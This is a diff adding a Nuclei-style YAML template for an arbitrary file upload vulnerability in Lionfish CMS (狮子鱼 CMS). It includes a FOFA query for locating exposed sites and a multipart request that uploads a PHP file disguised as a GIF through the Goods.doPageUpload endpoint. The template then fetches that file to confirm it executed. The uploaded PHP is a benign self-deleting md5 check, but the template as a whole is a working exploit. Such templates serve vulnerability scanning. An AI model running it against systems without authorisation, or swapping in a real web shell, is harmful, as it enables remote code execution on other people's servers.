@@ -1,0 +1,64 @@
+id: lionfish-cms-wxapp-php-upload
+
+info:
+  name: 狮子鱼 CMS 任意文件上传
+  author: SleepingBag945
+  severity: critical
+  description: |
+    FOFA: body="/seller.php?s=/Public/login"
+  reference:
+    - https://www.cnblogs.com/KHZ521/p/14782653.html
+
+variables:
+  rboundary: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="upfile"; filename="test.php"
+        Content-Type: image/gif
+
+        <?php echo md5(233);unlink(__FILE__);?>
+        ------WebKitFormBoundary{{rboundary}}--
+
+      - |
+        GET /Uploads/image/goods/{{path_1}}/{{path_2}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: path_1
+        internal: true
+        group: 1
+        regex:
+          - '"image_o":".*goods\\\/(.*?)\\\/(.*?)"'
+
+      - type: regex
+        name: path_2
+        internal: true
+        group: 2
+        regex:
+          - '"image_o":".*goods\\\/(.*?)\\\/(.*?)"'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - "image_o"
+        condition: and
+
+      - type: word
+        part: body_2
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+        condition: and
+
+      - type: status
+        status:
+          - 200
